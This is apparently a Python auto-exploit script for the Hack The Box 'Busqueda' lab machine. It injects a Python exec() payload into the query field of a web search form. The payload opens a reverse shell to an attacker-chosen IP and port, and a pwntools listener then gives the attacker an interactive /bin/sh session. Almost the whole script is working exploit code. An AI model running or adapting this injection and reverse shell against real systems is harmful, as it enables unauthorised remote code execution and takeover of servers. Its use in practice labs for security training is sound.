#!/usr/bin/env python3
# Author: Juan Garcia aka liandd
import signal
import sys
from termcolor import colored
import requests
import argparse
import threading
from pwn import *


# Ctrl_C
def def_handler(sig, frame):
    print(colored("\n\n[!] Saliendo...", "red"))
    sys.exit(1)


# Ctrl_C
signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(
        description=colored("AutoPwn Busqueda", "red")+colored(" HTB", "green")+" by "+colored("liandd", "red"))
    parser.add_argument('-u', '--url', dest="URL",
                        help="Machine URL to Pwn (i.e --url http://searcher.htb)")
    parser.add_argument('-i', '--ip', dest="IP",
                        help="IP address to get shell (i.e --IP 10.10.16.42)")
    parser.add_argument('-p', '--port', dest="PORT",
                        help="PORT to get shell (i.e --port 443)")

    options = parser.parse_args()
    if options.URL is None or options.IP is None or options.PORT is None:
        parser.print_help()
        print("\n\n")
        sys.exit(1)
    return options.URL, options.IP, options.PORT


def searchorExploit(URL, IP, PORT):
    reverse = """', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('%s',%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#""" % (
        IP, PORT)

    data = {'engine': 'Yandex',
            'query': reverse}

    r = requests.post(URL + "/search", data=data)


def main():
    URL, IP, PORT = get_arguments()

    try:
        threading.Thread(target=searchorExploit, args=(URL, IP, PORT)).start()
    except Exception as e:
        print(colored(e, "red"))

    shell = listen(PORT, timeout=20).wait_for_connection()
    shell.interactive()


if __name__ == '__main__':
    main()
